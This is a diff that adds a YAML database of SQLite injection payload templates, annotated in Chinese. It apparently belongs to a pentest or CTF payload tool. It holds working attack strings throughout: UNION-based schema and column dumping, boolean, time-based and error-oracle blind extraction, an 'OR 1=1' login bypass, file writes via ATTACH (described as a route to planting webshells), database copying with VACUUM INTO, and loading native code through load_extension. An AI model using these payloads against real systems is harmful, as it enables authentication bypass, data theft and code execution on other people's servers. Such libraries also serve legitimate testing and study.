@@ -1,0 +1,394 @@
+ruleDB: v0.1.0
+# SQLite 注入模板。
+#
+# 方言特点：
+#   - 没有 information_schema，元数据在 sqlite_master
+#   - **没有 sleep 函数**，时间盲注只能靠重查询烧 CPU（randomblob）
+#   - **没有能把数据带进报错的函数**：SQLite 是弱类型，CAST 和算术都不报错，
+#     也没有 updatexml / exp 这类会在报错里回显入参的函数。所以本文件没有
+#     error.dump 之类的模板——这不是遗漏，是这门方言里没有这条路。
+#     报错只能用成**布尔的预言机**（报错的有无当真假信号），两条：
+#       error.oracle        —— 用条件决定报不报错，逐字符猜任意数据（比 randomblob 计时稳）
+#       error.schema_probe  —— 引用不存在的表/列，错误信息里带出那个名字，做存在性判断
+
+templates:
+  - id: sqli.sqlite.detect.version
+    name: SQLite 版本回显
+    desc: SQLite 没有版本变量，取的是 sqlite_version() 函数。UNION 两侧列数对不上会直接报错，正好用它确认列数
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,sqlite_version())>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.union.basic
+    name: SQLite UNION 联合查询
+    desc: 还不知道回显位时先用它，整条 SELECT 都是数字占位。SQLite 是弱类型，数字塞进哪一列都不会因类型不符报错
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.union.marker
+    name: SQLite UNION 回显位标记
+    desc: "用标记找哪一列会回显。默认的 0x41 在 SQLite 里是整数 65，页面上出现 65 就说明那一列是回显位；想要字面量标记可以选 'ab' 那项"
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+      marker:  {options: ["0x41", "'ab'", "'a b'"], default: "0x41"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,marker)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.union.tables
+    name: SQLite 读表名
+    desc: 元数据在 sqlite_master，type='table' 这个字面量不该被绕过改到
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,group_concat(name))>> FROM sqlite_master WHERE type='table' <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.sqlite.union.schema
+    name: SQLite 读建表语句
+    desc: 直接拿 CREATE 语句，省去逐列猜名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,sql)>> FROM sqlite_master WHERE name='<<table>>' <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.sqlite.bool.blind
+    name: SQLite 布尔盲注
+    desc: 页面在条件为真/假时返回的内容不同时用。SQLite 没有 sleep，时间盲注只能拿 randomblob 烧 CPU 硬凑，延时还不稳定，能靠真假差异就别碰
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND (<<cond>>) <<comment>>"
+    vars: [cond]
+    requires: [boolean]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.time.randomblob
+    name: SQLite 时间盲注 randomblob
+    desc: SQLite 没有 sleep，只能靠生成大 blob 烧 CPU 制造延时。延时是否稳定取决于目标机器，需自行标定
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      size:    {options: ["1000000", "10000000", "100000000", "500000000"], default: "100000000"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND length(randomblob(<<size>>))>0 <<comment>>"
+    vars: []
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.sqlite.file.attach
+    name: SQLite ATTACH 写文件
+    desc: 把数据库文件写到目标路径（常用于写 webshell 或用 SQL 语法构造文件内容）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; ATTACH DATABASE '<<filepath>>' AS pwn--"
+    vars: [filepath]
+    requires: [stacked, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.sqlite.auth.bypass
+    name: SQLite 登录绕过
+    desc: 闭合符按注入点上下文选
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> OR 1=1<<comment>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.auth.bypass.admin
+    name: SQLite 指定用户登录绕过
+    desc: 已知用户名时的绕过。用户名默认 admin，按目标实际账号改
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      username: {options: ["admin", "administrator", "root", "sa", "test", "guest"],
+                 default: "admin"}
+      close:    {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment:  {options: ["--", "/**/"], default: "--"}
+    body: "<<username>><<close>> <<comment>>"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.union.dump
+    name: SQLite 读列数据
+    desc: 已知表名与列名后把整列拉出来
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["group_concat(<<col>>)", "group_concat(<<col>>,'|')"],
+               default: "group_concat(<<col>>,'|')"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM <<table>> <<comment>>"
+    vars: [col, table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.blind.substr
+    name: SQLite 布尔盲注逐字符
+    desc: 没有报错注入时的主力：按位置取一个字符跟候选比，响应有差异即命中。先用 length() 探出长度能少猜很多轮
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND (SELECT substr(<<col>>,<<pos>>,1) FROM <<table>> LIMIT 1)='<<ch>>' <<comment>>"
+    vars: [col, table, pos, ch]
+    requires: [boolean, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.time.randomblob.cond
+    name: SQLite 时间盲注（带条件）
+    desc: 上面那条无条件版本只能确认「注入存在」。这条把重查询挂在条件上，才能逐字符判断真假
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      size:    {options: ["10000000", "100000000", "500000000"], default: "100000000"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    # 条件为假时走 ELSE 0，0>0 直接返回，不碰 randomblob —— 快慢差异就是判据
+    body: "<<close>> AND (SELECT CASE WHEN (<<cond>>) THEN length(randomblob(<<size>>)) ELSE 0 END)>0 <<comment>>"
+    vars: [cond]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.load_extension
+    name: SQLite 加载扩展
+    desc: 直接把 SO/DLL 当 SQLite 扩展加载进来执行。需要堆叠查询且目标没禁用扩展加载（默认是禁的）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; SELECT load_extension('<<filepath>>')--"
+    vars: [filepath]
+    requires: [stacked, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 元数据：sqlite_master 之外 ----
+  # sqlite_master 只给建表语句，要自己解析；3.16 起多了「表函数」形式，
+  # 能像普通表一样 SELECT，列名的类型、是否主键这些直接就是列。
+
+  - id: sqli.sqlite.union.pragma_table_info
+    name: SQLite 读列名（pragma_table_info）
+    desc: 读列名的结构化路径——sqlite_master 那条只给建表语句，还得自己解析。表函数形式直接返回 name / type / notnull / pk 这几个列。3.16 起才有表函数，更老的版本退回 sqlite_master 那条
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.16"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:
+        options: ["group_concat(name)", "group_concat(name||':'||type)",
+                  "group_concat(name,',')", "name"]
+        default: "group_concat(name)"
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM pragma_table_info('<<table>>') <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.union.databases
+    name: SQLite 枚举已挂载的库
+    desc: flag 常常不在主库里。目标自己 ATTACH 了别的库文件时、或者你用 file.attach 挂上一个之后，先列出来再逐个读——读挂载库要写成 `库名.sqlite_master`。同样是 3.16 起的表函数
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.16"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      # 带 file 的那两档才看得出库文件落在哪，只列 name 只知道挂了个库
+      expr:
+        options: ["group_concat(name)", "group_concat(name||':'||file)", "group_concat(file)"]
+        default: "group_concat(name||':'||file)"
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM pragma_database_list <<comment>>"
+    vars: []
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 写文件：ATTACH 之外 ----
+
+  - id: sqli.sqlite.file.vacuum_into
+    name: SQLite VACUUM INTO 搬库
+    desc: ATTACH 之外的落地路径。写出来的是**一个完整的 SQLite 库文件**，不是任意内容——所以别拿它写 webshell；它的用处是把目标库整个复制到你能取到的地方，或者确认某条路径可写。目标文件**必须不存在**，也不能在事务里跑。3.27 起才有这一条（更早的版本报 INTO 附近语法错误）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.27"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; VACUUM INTO '<<filepath>>'--"
+    vars: [filepath]
+    requires: [stacked, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错：只能做存在性判断 ----
+
+  - id: sqli.sqlite.error.schema_probe
+    name: SQLite 报错探测表名列名
+    desc: SQLite 没有能把查询结果带进报错的函数，所以这里没有数据带出型的报错注入。能用的只有报错本身：引用不存在的表或列时，错误信息里会出现那个名字——页面回显报错时它就是个存在性预言机，用来确认表名列名。列存在时子查询正常返回第一行，不报错
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    body: "<<close>> AND 1=(SELECT <<col>> FROM <<table>>) <<comment>>"
+    vars: [col, table]
+    requires: [error, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.sqlite.error.oracle
+    name: SQLite 报错布尔预言机
+    desc: SQLite 不会把查询结果写进报错，但可以让**条件**决定报不报错，拿报错的有无当真假信号逐字符猜——这是这门方言里唯一能带出任意数据的报错用法，而且比 randomblob 计时稳。两个坑：`1/0` 在 SQLite 里**返回 NULL 不报错**，别拿它当预言机；常量折叠可能让优化器跳过报错分支，所以外面套一层 SELECT
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [sqlite]
+    version: ">=3.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["--", "/**/"], default: "--"}
+    # abs(-9223372036854775807-1) 必然 integer overflow（SQLite 自己的测试套件里就是这个用例）；
+    # 写成 abs(-9223372036854775808) 会被当成对 9223372036854775808 取负，语义就变了
+    body: "<<close>> AND (SELECT CASE WHEN (<<cond>>) THEN 1 ELSE abs(-9223372036854775807-1) END) <<comment>>"
+    vars: [cond]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
